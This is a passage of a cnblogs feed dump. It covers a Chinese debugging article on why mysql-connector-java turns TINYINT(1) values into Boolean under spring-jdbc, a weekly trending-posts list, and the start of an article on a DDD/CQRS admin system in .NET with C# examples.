/></div>\n<p>数据库我们已经确定没问题了，至于是 <code>mysql-connector-java 8.0.25</code>、<code>HikariCP 4.0.3</code>、<code>spring-jdbc 5.3.31</code> 谁做了特殊处理，需要我们进一步排查了；最直接的方式就是 <code>Debug</code> 嘛，断点我已经替你们打好</p>\n<div align=\"center\"><img alt=\"断点debug\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230148-1870125991.png\" /></div>\n<p>此时到了 MySQL JDBC 驱动里面，我们来看一下 <code>this.results</code> 的信息，有几个点值得我们重点关注下</p>\n<ol>\n<li>\n<p>连接元信息</p>\n<div align=\"center\"><img alt=\"连接元信息\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229967-754344306.png\" /></div>\n<p>我们配置的连接 url 是</p>\n<pre><code class=\"language-yaml\">spring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/fnj_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC\n</code></pre>\n<p>并未设置 <code>tinyint1isBit</code> 值，所以其值 true 是 <code>mysql-connector-java 8.0.25</code> 给的默认值</p>\n</li>\n<li>\n<p>列元信息</p>\n<div align=\"center\"><img alt=\"列元信息\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230080-823708694.png\" /></div>\n<p>可以看到，字段 exec_status 的 length = 1，这个 length 表示什么呢，因为列 exec_status 的类型是整数类型，所以这个 length 是不是就是 <code>显示宽度</code> ？不然还能代表什么？</p>\n<p>最重要的来了，<code>mysqlType</code> 的 <code>name</code> 是 <code>BIT</code></p>\n<div align=\"center\"><img alt=\"mysqltype_bit\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229818-885124704.png\" /></div>\n<p>也就是说，mysql-connector-java 8.0.25 把 TINYINT(1) 解析成了 MysqlType.BIT，对应的 JAVA 类型就是 <code>Boolean</code></p>\n</li>\n</ol>\n<p>既然 exec_status 的 JAVA 类型被解析成了 Boolean，其值 2 也就被解析成 true 了，所以标题的答案是不是就清楚了</p>\n<blockquote>\n<p>mysql-connector-java 8.0.25 默认情况下，把 TINYINT(1) 解析成 JAVA 的 Boolean</p>\n</blockquote>\n<p>问题又来了，mysql-connector-java 8.0.25 对 TINYINT 的解析逻辑是怎样的呢？我们跟下源码就知道了</p>\n<div align=\"center\"><img alt=\"mysqlType赋值逻辑\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230115-2024493590.png\" /></div>\n<p>我们先定位到 <code>com.mysql.cj.protocol.a.ColumnDefinitionReader</code> 的 180 行，然后往上找到 <code>mysqlType</code> 赋值的地方（ColumnDefinitionReade 134 行）</p>\n<pre><code class=\"language-java\">MysqlType mysqlType = NativeProtocol.findMysqlType(this.protocol.getPropertySet(), colType, colFlag, colLength, tableName, originalTableName,\n                collationIndex, encoding);\n</code></pre>\n<p>跟进 NativeProtocol.findMysqlType，我们能看到这样一段代码</p>\n<div align=\"center\"><img alt=\"tinyint赋值逻辑\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229886-1256879629.png\" /></div>\n<p>第一个 if，我们分几部分解析下</p>\n<ol>\n<li>\n<p>isUnsigned</p>\n<p>表示是否无符号，建表的时候，exec_status 并未明确指定 <code>UNSIGNED</code>，所以是有符号的，那么 isUnsigned 值是 false，取反则是 true</p>\n</li>\n<li>\n<p>length</p>\n<p>表字段的显示宽度，也就是 TINYINT(1) 中的 1，所以 length == 1 的结果是 true</p>\n</li>\n<li>\n<p>tinyInt1isBit</p>\n<p>mysql-connector-java 8.0.25 的 <code>PropertyDefinitions</code> 会静态初始化很多属性默认值，其中就包括 tinyInt1isBit</p>\n<div align=\"center\"><img alt=\"tinyInt1isBit默认值\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230030-1104270104.png\" /></div>\n<p>tinyInt1isBit 的默认值是 true</p>\n<p>如果我们在数据库连接 url 中增加 <code>tinyInt1isBit=false</code></p>\n<pre><code class=\"language-yaml\">spring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/fnj_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC&amp;tinyInt1isBit=false\n</code></pre>\n<p>那么配置值会覆盖默认值</p>\n<div align=\"center\"><img alt=\"tinyInt1isBit值覆盖\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230276-1204340058.png\" /></div>\n<pre><code class=\"language-java\">setValueInternal(extractedValue, exceptionInterceptor);\nthis.initialValue = this.value;\n</code></pre>\n<p>这两行会分别将 <code>value</code> 和 <code>initialValue</code> 设置成 <code>false</code></p>\n<p>回到 url 未配置 tinyInt1isBit 的情况，tinyInt1isBit 的值是默认值 true</p>\n</li>\n<li>\n<p>内嵌 if 的 transformedBitIsBoolean</p>\n<p>在分析 tinyInt1isBit 默认值的时候，也红框框住过 transformedBitIsBoolean 的默认值，是 false；没注意的小伙伴，可以往上翻一翻</p>\n</li>\n</ol>\n<p>所以 NativeProtocol.findMysqlType 的返回值是 <code>MysqlType.BIT</code>。如果 length &gt; 1，那么返回的则是 <code>MysqlType.TINYINT_UNSIGNED</code> 或 <code>MysqlType.TINYINT</code></p>\n<p>自此，来龙去脉是不是清楚呢？</p>\n<h2 id=\"问题处理\">问题处理</h2>\n<p>既然已经找到问题原因，那么处理方式也就清晰了，有如下几种</p>\n<ol>\n<li>\n<p>url 中配置 tinyInt1isBit=false</p>\n<p>这个会全局生效，有些需要将 TINYINT(1) 映射成 Boolean 的情况，会出问题</p>\n<p>老项目不推荐增加该配置，除非确定整个项目中没有 TINYINT(1) 映射成 Boolean 的情况</p>\n<p>新项目的话，可以增加该配置</p>\n</li>\n<li>\n<p>字段类型调整成无符号</p>\n<p>增加 <code>UNSIGNED</code> 修饰，例如</p>\n<pre><code class=\"language-sql\">`exec_status` tinyint(1) unsigned DEFAULT 0 COMMENT '执行-状态，0：等待中，1：执行中，2：成功，3：失败，4：终止',\n</code></pre>\n<p>但有个前提，枚举值不能出现负数</p>\n</li>\n<li>\n<p>调大字段类型显示宽度</p>\n<p>直接使用 TINYINT(4) 或 TINYINT</p>\n</li>\n</ol>\n<h2 id=\"举一反三\">举一反三</h2>\n<p>既然是 mysql-connector-java 8.0.25 做了默认值的处理，那么 MyBatis-Plus 查的结果是不是也是将 2 处理成 true 呢？我们试一下就知道了，引入 MyBatis-Plus 3.5.7，测试代码很简单</p>\n<pre><code class=\"language-java\">@TableName(\"tbl_qsl_job\")\npublic class QslJob {\n\n    private Integer id;\n    private Integer execStatus;\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public Integer getExecStatus() {\n        return execStatus;\n    }\n\n    public void setExecStatus(Integer execStatus) {\n        this.execStatus = execStatus;\n    }\n}\n\n\t@Resource\n    private QslJobDao qslJobDao;\n    \n    @Test\n    public void testMybatisPlus() {\n        QslJob qslJob = qslJobDao.selectById(1);\n        System.out.println(qslJob.getId() + \" \" + qslJob.getExecStatus());\n    }\n</code></pre>\n<p>你们觉得执行结果是怎样的，报错？输出 1 true？还是输出 1 2？执行下就知道了</p>\n<div align=\"center\"><img alt=\"tinyint(1)_mybatis-plus\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229833-1537452094.png\" /></div>\n<p>查询结果正常！</p>\n<p>按前面的分析，mysql-connector-java 8.0.25 返回 exec_status 的值是 true，Boolean 强转 Integer 会报错，即使不报错，结果也应该是 1（0 = false，1 = true）嘛，怎么会是 2 呢？</p>\n<div align=\"center\"><img alt=\"好难 不该学编程的\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229819-259112532.jpg\" /></div>\n<p>Debug 下你们就明白了</p>\n<div align=\"center\"><img alt=\"mybatis_getInt\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230380-1646506667.png\" /></div>\n<p>Mybatis 需要将 mysql-connector-java 8.0.25 查到的 ResultSet 映射成 QslJob，就需要用到类型处理器；QslJob 实体的 execStatus 是 Integer 类型的，那肯定用 IntegerTypeHandler 进行处理嘛，自然而然就用到 <code>rs.getInt</code> ，查到的结果自然就是 2 了。</p>\n<p>我们再回过头去看 <code>SqlRowSet</code>，如果我们用 sqlRowSet.getInt 替换 sqlRowSet.getObject，是不是就行了？</p>\n<pre><code class=\"language-java\">@Test\npublic void getByJdbcTemplate() {\n    SqlRowSet sqlRowSet = jdbcTemplate.queryForRowSet(\"SELECT * FROM tbl_qsl_job WHERE id = 1\");\n    SqlRowSetMetaData metaData = sqlRowSet.getMetaData();\n    while (sqlRowSet.next()) {\n        for (int i = 1; i &lt;= metaData.getColumnCount(); i++) {\n            System.out.print(sqlRowSet.getInt(i) + \" \");\n        }\n        System.out.println();\n    }\n}\n</code></pre>\n<p>运行下，我们会发现报错了</p>\n<div align=\"center\"><img alt=\"getInt报\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230281-1107795933.png\" /></div>\n<p>这又是为什么？</p>\n<p>原因在 JdbcTemplate 的数据提取</p>\n<div align=\"center\"><img alt=\"extractData\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230041-1506294441.png\" /></div>\n<p>我们对 rs 进行一下 Evaluate，结果如下</p>\n<div align=\"center\"><img alt=\"rs_evaluate\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229893-1587179875.png\" /></div>\n<p>此时 rs.getInt 能正常获取到 2，这说明什么？</p>\n<blockquote>\n<p>mysql-connector-java 8.0.25 虽然把 TINYINT(1) 映射成了 JAVA 的 Boolean，但其查到的 ResultSet 中的数据仍是与数据库中数据一致的原始数据</p>\n<p>HikariCP 4.0.3 也并未对原始数据做转换处理</p>\n</blockquote>\n<p>我们继续跟进 rse.extractData(rs)，跟进两层会来到关键点</p>\n<div align=\"center\"><img alt=\"cachedRowSet\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230333-1252826137.png\" /></div>\n<p>rowSet.populate(rs) 会把 ResultSet rs 中的数据填充到 CachedRowSetImpl 的 <code>rvh</code> 中</p>\n<div align=\"center\"><img alt=\"rhv\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230242-1871321000.png\" /></div>\n<p>我们接着跟进 sqlRowSet.getInt(i)，答案即将揭晓</p>\n<div align=\"center\"><img alt=\"getInt_error\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229879-213147928.png\" /></div>\n<p>红框框住是不是就会抛异常了？我们继续跟进 this.getCurrentRow，会看到我们刚刚讲到的 <code>rvh</code></p>\n<pre><code class=\"language-java\">protected BaseRow getCurrentRow() {\n    return (BaseRow)(this.onInsertRow ? this.insertRow : (BaseRow)((BaseRow)this.rvh.get(this.cursorPos - 1)));\n}\n</code></pre>\n<p>是不是就呼应上了？这里有两个呼应</p>\n<ol>\n<li>\n<p>显示宽度</p>\n<p>前面已经讲到，显示宽度会作为结果集的元数据返回，是否使用取决于应用程序</p>\n<p>spring-jdbc 的 SqlRowSetResultSetExtractor#createSqlRowSet 方法用到了 CachedRowSetImpl#populate，在进行数据填充的过程中，会调用</p>\n <div align=\"center\"><img alt=\"调用myql驱动的getObject\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229943-1349522055.png\" /></div>\n<p>mysql-connector-java 8.0.25 的 ResultSetImpl#getObject(int) 方法</p>\n <div align=\"center\"><img alt=\"BIT处理\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230095-1344646817.png\" /></div>\n<p>是不是相当于用到了显示宽度？</p>\n</li>\n<li>\n<p>rvh</p>\n<p>CachedRowSetImpl#populate 方法，将数据填充到了 Vector rvh 中<p></p>\n<p>而我们写的代码 sqlRowSet.getInt(i) 是从这个 rvh 中获取的</p>\n\n\n<p>所以，归根结底是 <strong>spring-jdbc 将 ResultSet 处理成 CachedRowSetImpl 的机制，我们没有遵循，才会出现 2 变 true 这种意料之外的结果</strong></p>\n<p>SQL Server 的 tinyint 会不会有类似问题呢？我可以肯定的告诉你们，目前不会有，因为 SQL Server 的 tinyint 没有显示宽度一说，就是固定的 <code>tinyint</code>，不支持 <code>tinyint(n)</code>，至于未来是否支持，未来再说嘛</p>\n<h2 id=\"总结\">总结</h2>\n<ol>\n<li>\n<p>MySQL 整数类型后面的 n 是显示宽度，表示显示时最少占 n 个字符宽度，既不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值</p>\n</li>\n<li>\n<p>MySQL 会把显示宽度作为结果集的元数据返回，所以 mysql-connector-java 8.0.25 能获取到</p>\n</li>\n<li>\n<p>mysql-connector-java 8.0.25 虽然有显示宽度，也提供了间接用到显示宽度的getObject方法，但其 ResultSet 中的数据与数据库中的数据是一致的</p>\n<p>至于上层应用如何使用 mysql-connector-java 8.0.25 中的元数据，由上层应用决定；spring-jdbc 就是上层应用之一、MyBatis 也是</p>\n</li>\n<li>\n<p>spring-jdbc 的 JdbcTemplate.queryForRowSet 会间接使用显示宽度，而 Mybatis 不会，MyBatis 有类型处理器</p>\n</li>\n<li>\n<p>如何避免标题中的问题，文中的 <strong>问题处理</strong> 章节已经说明，推荐第三种方式</p>\n<blockquote>\n<p>不使用 TINYINT(1)，直接使用 TINYINT(4) 或 TINYINT</p>\n</blockquote>\n</li>\n</ol>\n</p></li></ol>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 08:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/youzhibing\">青石路</a>&nbsp;\n阅读(<span id=\"post_view_count\">32</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "上周热点回顾（1.12-1.18）",
      "link": "https://www.cnblogs.com/cmt/p/19499970",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/cmt/p/19499970\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 08:27\">\n    <span>上周热点回顾（1.12-1.18）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>热点随笔：</p>\n<p> · <a href=\"https://www.cnblogs.com/sdcb/archive/2026/01/15/20261113-big-integer-dotnet-10-vs-java.html\" target=\"_blank\">不服跑个分？.NET 10 大整数计算对阵 Java，结果令人意外</a> (<a href=\"https://www.cnblogs.com/sdcb/\" target=\"_blank\">.NET骚操作</a>) <br />\n · <a href=\"https://www.cnblogs.com/dotnet-org-cn/archive/2026/01/12/19473369.html\" target=\"_blank\">一个高性能的 .NET MQTT 客户端与服务器库</a>\n(<a href=\"https://www.cnblogs.com/dotnet-org-cn/\" target=\"_blank\">中国.NET研究协会</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/zxlh1529/archive/2026/01/14/19480754.html\" target=\"_blank\">新的一年，写给博客园的大家，也写给自己</a>\n(<a href=\"https://www.cnblogs.com/zxlh1529/\" target=\"_blank\">幼儿园技术家</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/SunSpring/archive/2026/01/13/19469874.html\" target=\"_blank\">2025总结篇，忙碌的日子里越过35岁，开启下一个征程</a>\n(<a href=\"https://www.cnblogs.com/SunSpring/\" target=\"_blank\">XSpringSun</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/whuanle/archive/2026/01/12/19469026.html\" target=\"_blank\">万字长文讲解：团队落地 AI 辅助编程和 AI Specs 实战</a>\n(<a href=\"https://www.cnblogs.com/whuanle/\" target=\"_blank\">痴者工良</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/guangzan/archive/2026/01/15/19487446.html\" target=\"_blank\">AI → JSON → UI</a>\n(<a href=\"https://www.cnblogs.com/guangzan/\" target=\"_blank\">guangzan</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/sdcb/archive/2026/01/13/20251203-interleaved-thinking.html\" target=\"_blank\">从 OpenAI 兼容到 Anthropic 崛起：大模型“交错思考”协议的演进与变局</a>\n(<a href=\"https://www.cnblogs.com/sdcb/\" target=\"_blank\">.NET骚操作</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/lichengxiao/archive/2026/01/15/19485897.html\" target=\"_blank\">新的旅程</a>\n(<a href=\"https://www.cnblogs.com/lichengxiao/\" target=\"_blank\">熬夜不早睡</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/Can-daydayup/archive/2026/01/12/19470057.html\" target=\"_blank\">让 WinForm.NET 再次伟大！一个专门设计用于帮助 WinForms 应用程序迁移到 Blazor WASM 平台的项目</a>\n(<a href=\"https://www.cnblogs.com/Can-daydayup/\" target=\"_blank\">追逐时光者</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/lijinhuaboke/archive/2026/01/14/19457121.html\" target=\"_blank\">高德地图实现实时轨迹展示</a>\n(<a href=\"https://www.cnblogs.com/lijinhuaboke/\" target=\"_blank\">此颜差矣。</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/Can-daydayup/archive/2026/01/13/19479370.html\" target=\"_blank\">C#/.NET/.NET Core技术前沿周刊 | 第 65 期（2026年1.1-1.11）</a>\n(<a href=\"https://www.cnblogs.com/Can-daydayup/\" target=\"_blank\">追逐时光者</a>)                    <br />\n · <a href=\"https://www.cnblogs.com/MeteorSeed/archive/2026/01/12/19460575.html\" target=\"_blank\">【译】使用 Visual Studio 2026 简化您的 Git 工作流程</a>\n(<a href=\"https://www.cnblogs.com/MeteorSeed/\" target=\"_blank\">MeteorSeed</a>)                    <br />\n            </p>\n<p>热点新闻：</p>\n<p>\n · <a href=\"https://news.cnblogs.com/n/812864/\" target=\"_blank\">因AI做的太好陷绝境！收入暴降80%，裁员75%，只剩6个月续命，下一个是谁？</a><br />\n · <a href=\"https://news.cnblogs.com/n/813046/\" target=\"_blank\">5行代码，逼疯整个硅谷！澳洲放羊大叔，捅开AI编程奇点</a><br />\n · <a href=\"https://news.cnblogs.com/n/812874/\" target=\"_blank\">Linux祖师爷真香现场！曾嘲讽AI编程是垃圾，如今亲自下场氛围编程</a><br />\n · <a href=\"https://news.cnblogs.com/n/812866/\" target=\"_blank\">年薪70万跌至几千块！第一批被AI取代的人类出现了</a><br />\n · <a href=\"https://news.cnblogs.com/n/812716/\" target=\"_blank\">马斯克宣布“X将在7天内公开所有算法”，包括推荐算法，以后每四周1次</a><br />\n · <a href=\"https://news.cnblogs.com/n/813044/\" target=\"_blank\">Digg 重新上线</a><br />\n · <a href=\"https://news.cnblogs.com/n/812977/\" target=\"_blank\">实测：千问App接入“阿里全家桶”，可以点外卖、订车票了</a><br />\n · <a href=\"https://news.cnblogs.com/n/812836/\" target=\"_blank\">内存暴涨10倍，手机电脑直呼买不起？中国厂商的机会，这次真的来了</a><br />\n · <a href=\"https://news.cnblogs.com/n/813054/\" target=\"_blank\">不得了，这个新技术把视频压缩到了0.02%！</a><br />\n · <a href=\"https://news.cnblogs.com/n/812777/\" target=\"_blank\">携程深夜发离职通知短信，后被澄清为乌龙事件</a><br />\n · <a href=\"https://news.cnblogs.com/n/812851/\" target=\"_blank\">KAN一作刘子鸣回国任教，清华官网盖章认证了</a><br />\n · <a href=\"https://news.cnblogs.com/n/813045/\" target=\"_blank\">被判违法的AI仲裁案，撕开了技术裁员的遮羞布</a></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 08:27</span>&nbsp;\n<a href=\"https://www.cnblogs.com/cmt\">博客园团队</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "基于NetCorePal Cloud Framework的DDD架构管理系统实践",
      "link": "https://www.cnblogs.com/aishangyipiyema/p/19499381",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/aishangyipiyema/p/19499381\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 22:57\">\n    <span>基于NetCorePal Cloud Framework的DDD架构管理系统实践</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"基于netcorepal-cloud-framework的ddd架构管理系统实践\">基于NetCorePal Cloud Framework的DDD架构管理系统实践</h1>\n<p>前段时间在做一个管理系统的项目，想尝试一下DDD架构在实际项目中的应用。经过一番调研，最终选择了NetCorePal Cloud Framework作为基础框架，结合.NET 10和Vue 3搭建了一套完整的前后端分离架构。今天就想和大家分享一下这个项目的架构设计和技术选型，希望能给正在做类似项目的朋友一些参考。</p>\n<p>项目源码地址：<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a></p>\n<h2 id=\"项目概述\">项目概述</h2>\n<p>这个项目是一个典型的企业级管理系统，包含了用户、角色、部门等基础功能模块。在技术选型上，采用了目前比较主流的技术栈：</p>\n<p>后端方面，使用.NET 10作为主要框架，配合EF Core做数据访问，FastEndpoints替代传统的Controller，MediatR实现CQRS模式。数据存储支持MySQL、PostgreSQL和SQL Server，消息队列选择了RabbitMQ（通过CAP框架集成），缓存用Redis，还集成了.NET Aspire来做云原生的基础设施管理。</p>\n<p>前端部分基于Vben Admin，这是一个非常优秀的Vue 3 + TypeScript + Vite的管理后台模板，UI组件用的是Ant Design Vue，整体体验不错。</p>\n<h2 id=\"架构设计\">架构设计</h2>\n<h3 id=\"分层架构\">分层架构</h3>\n<p>整个项目采用了经典的三层架构，这个结构应该很多做DDD的朋友都比较熟悉。三层之间的依赖关系是单向的：Web层依赖Infrastructure层，Infrastructure层依赖Domain层，Domain层作为核心，不依赖任何其他层。</p>\n<pre><code>Ncp.Admin\n├── Domain（领域层）\n│   ├── AggregatesModel（聚合模型）\n│   └── DomainEvents（领域事件）\n├── Infrastructure（基础设施层）\n│   ├── EntityConfigurations（实体配置）\n│   └── Repositories（仓储实现）\n└── Web（表现层）\n    ├── Application（应用服务层）\n    │   ├── Commands（命令）\n    │   ├── Queries（查询）\n    │   └── DomainEventHandlers（领域事件处理器）\n    └── Endpoints（API端点）\n</code></pre>\n<p>这种分层的好处是职责清晰，Domain层只关注业务逻辑，Infrastructure层负责技术实现，Web层处理HTTP请求和响应。</p>\n<h3 id=\"核心设计模式\">核心设计模式</h3>\n<h4 id=\"1-领域驱动设计ddd\">1. 领域驱动设计（DDD）</h4>\n<p>在这个项目中，DDD主要体现在聚合根的设计上。每个聚合根都有自己的业务边界，状态只能通过业务方法来修改。就拿部门这个聚合根来说吧：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门ID（强类型ID）\n/// &lt;/summary&gt;\npublic partial record DeptId : IInt64StronglyTypedId;\n\n/// &lt;summary&gt;\n/// 部门聚合根\n/// &lt;/summary&gt;\npublic class Dept : Entity&lt;DeptId&gt;, IAggregateRoot\n{\n    public string Name { get; private set; } = string.Empty;\n    public string Remark { get; private set; } = string.Empty;\n    public DeptId ParentId { get; private set; } = default!;\n    public int Status { get; private set; } = 1;\n    \n   \n    protected Dept() { }\n    \n    // 业务方法：更新部门信息\n    public void UpdateInfo(string name, string remark, DeptId parentId, int status)\n    {\n        Name = name;\n        Remark = remark;\n        ParentId = parentId;\n        Status = status;\n        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);\n        \n        // 发布领域事件\n        AddDomainEvent(new DeptInfoChangedDomainEvent(this));\n    }\n    \n    // 软删除\n    public void SoftDelete()\n    {\n        if (IsDeleted)\n        {\n            throw new KnownException(\"部门已经被删除\");\n        }\n        IsDeleted = true;\n        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);\n    }\n}\n</code></pre>\n<p>这里有几个设计点我觉得值得说一下。首先是强类型ID，比如<code>DeptId</code>，这样可以避免把部门ID和用户ID搞混，编译器就能帮你检查出来。其次是属性都用<code>private set</code>，外面不能直接修改，必须通过业务方法，这样就保证了业务规则的一致性。另外，当部门信息变更时会发布领域事件，这样可以通知其他需要同步更新的地方，比如用户表中的部门名称。</p>\n<h4 id=\"2-cqrs模式命令查询职责分离\">2. CQRS模式（命令查询职责分离）</h4>\n<p>CQRS在这个项目中主要体现在读写分离上。写操作通过命令（Command）来处理，读操作通过查询（Query）来处理。这样做的好处是职责清晰，而且可以针对不同的场景做优化。</p>\n<p>写操作这边，命令的定义很简单，就是一个record。每个命令都有对应的验证器和处理器。看一个创建部门的例子：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 创建部门命令\n/// &lt;/summary&gt;\npublic record CreateDeptCommand(string Name, string Remark, DeptId? ParentId, int Status) \n    : ICommand&lt;DeptId&gt;;\n\n/// &lt;summary&gt;\n/// 命令验证器\n/// &lt;/summary&gt;\npublic class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;\n{\n    public CreateDeptCommandValidator(DeptQuery deptQuery)\n    {\n        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage(\"部门名称不能为空\");\n        RuleFor(d =&gt; d.Name)\n            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))\n            .WithMessage(d =&gt; $\"该部门已存在，Name={d.Name}\");\n        RuleFor(d =&gt; d.Status).InclusiveBetween(0, 1).WithMessage(\"状态值必须为0或1\");\n    }\n}\n\n/// &lt;summary&gt;\n/// 命令处理器\n/// &lt;/summary&gt;\npublic class CreateDeptCommandHandler(IDeptRepository deptRepository) \n    : ICommandHandler&lt;CreateDeptCommand, DeptId&gt;\n{\n    public async Task&lt;DeptId&gt; Handle(CreateDeptCommand request, CancellationToken cancellationToken)\n    {\n        var parentId = request.ParentId ?? new DeptId(0);\n        var dept = new Dept(request.Name, request.Remark, parentId, request.Status);\n        \n        await deptRepository.AddAsync(dept, cancellationToken);\n        \n        // 注意：不需要手动调用SaveChanges，框架会自动处理\n        return dept.Id;\n    }\n}\n</code></pre>\n<p>验证器这里用了FluentValidation，支持同步和异步验证。比如检查部门名称是否已存在这种需要查数据库的验证，就可以用异步的<code>MustAsync</code>。</p>\n<p>读操作这边，直接使用DbContext，而且可以用投影来优化性能。比如获取部门树的时候，只选择需要的字段：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门查询服务\n/// &lt;/summary&gt;\npublic class DeptQuery(ApplicationDbContext applicationDbContext) : IQuery\n{\n    private DbSet&lt;Dept&gt; DeptSet { get; } = applicationDbContext.Depts;\n    \n    /// &lt;summary&gt;\n    /// 获取部门树（使用投影优化性能）\n    /// &lt;/summary&gt;\n    public async Task&lt;IEnumerable&lt;DeptTreeDto&gt;&gt; GetDeptTreeAsync(\n        bool includeInactive = false, \n        CancellationToken cancellationToken = default)\n    {\n        // 使用投影只选择需要的字段，减少内存占用\n        var allDepts = await DeptSet.AsNoTracking()\n            .WhereIf(!includeInactive, d =&gt; d.Status != 0)\n            .Select(d =&gt; new DeptTreeNode\n            {\n                Id = d.Id,\n                Name = d.Name,\n                Remark = d.Remark,\n                ParentId = d.ParentId,\n                Status = d.Status,\n                CreatedAt = d.CreatedAt\n            })\n            .ToListAsync(cancellationToken);\n        \n        // 在内存中构建树形结构\n        return BuildTreeStructure(allDepts);\n    }\n}\n</code></pre>\n<p>这样读写分离的好处是，查询这边可以针对不同的查询场景做优化，比如用投影减少内存占用，或者将来可以加缓存、用读库等，而不会影响写操作的逻辑。</p>\n<h4 id=\"3-事件驱动架构\">3. 事件驱动架构</h4>\n<p>事件驱动这块，项目实现了领域事件和集成事件两种机制。领域事件主要用于聚合内部的同步操作，集成事件用于跨服务通信。</p>\n<p>比如说，当部门信息变更的时候，需要同步更新用户表中的部门名称。这个过程就可以通过领域事件来实现：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门信息变更领域事件\n/// &lt;/summary&gt;\npublic record DeptInfoChangedDomainEvent(Dept Dept) : IDomainEvent;\n</code></pre>\n<p>然后在事件处理器中处理这个逻辑：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门信息变更领域事件处理器 - 用于更新用户部门名称\n/// &lt;/summary&gt;\npublic class DeptInfoChangedDomainEventHandlerForUpdateUserDeptName(\n    IMediator mediator, \n    UserQuery userQuery) \n    : IDomainEventHandler&lt;DeptInfoChangedDomainEvent&gt;\n{\n    public async Task Handle(DeptInfoChangedDomainEvent domainEvent, CancellationToken cancellationToken)\n    {\n        var dept = domainEvent.Dept;\n        var deptId = dept.Id;\n        var newDeptName = dept.Name;\n        \n        // 查询所有属于该部门的用户ID\n        var userIds = await userQuery.GetUserIdsByDeptIdAsync(deptId, cancellationToken);\n        \n        // 通过Command更新每个用户的部门名称（而不是直接操作数据库）\n        foreach (var userId in userIds)\n        {\n            var command = new UpdateUserDeptNameCommand(userId, newDeptName);\n            await mediator.Send(command, cancellationToken);\n        }\n    }\n}\n</code></pre>\n<p>这样设计的好处是，部门聚合和用户聚合之间没有直接依赖，通过事件来通信。如果将来需要增加新的业务逻辑，比如部门变更时要发送通知，只需要再加一个事件处理器就行了，不需要改现有的代码。</p>\n<h4 id=\"4-fastendpoints轻量级api框架\">4. 